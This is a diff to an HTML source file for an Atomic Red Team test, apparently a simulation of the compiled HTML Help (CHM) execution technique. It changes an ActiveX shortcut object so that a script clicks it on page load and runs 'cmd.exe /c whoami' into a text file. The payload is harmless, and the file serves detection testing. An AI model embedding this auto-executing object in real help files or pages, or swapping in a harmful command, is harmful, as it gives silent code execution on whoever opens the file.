@@ -1,14 +1,17 @@
 <html>
     <head>
         <title>Atomic Red Team Compiled HTML Help File</title>
-<OBJECT id="ART" type="application/x-oleobject" classid="clsid:52a2aaae-085d-4187-97ea-8c30db990436" codebase="hhctrl.ocx#Version=5,02,3790,1194" width="1" height="1">
-<PARAM name="Command" value="ShortCut">
-<PARAM name="Button" value="Bitmap:shortcut">
-<PARAM name="Item1" value=",cmd.exe,/c whoami > c:\temp\output.txt">
-<PARAM name="Item2" value="273,1,1">
-</object>
+<OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+  <PARAM name="Command" value="ShortCut">
+  <PARAM name="Button" value="Bitmap::shortcut">
+  <PARAM name="Item1" value=',cmd.exe,/c whoami > test.txt'>
+  <PARAM name="Item2" value="273,1,1">
+</OBJECT>
+<SCRIPT>
+  x.Click();
+</SCRIPT>
 <script>
-ART.Click();
+x.Click();
 </script>
 </head>
 <body>
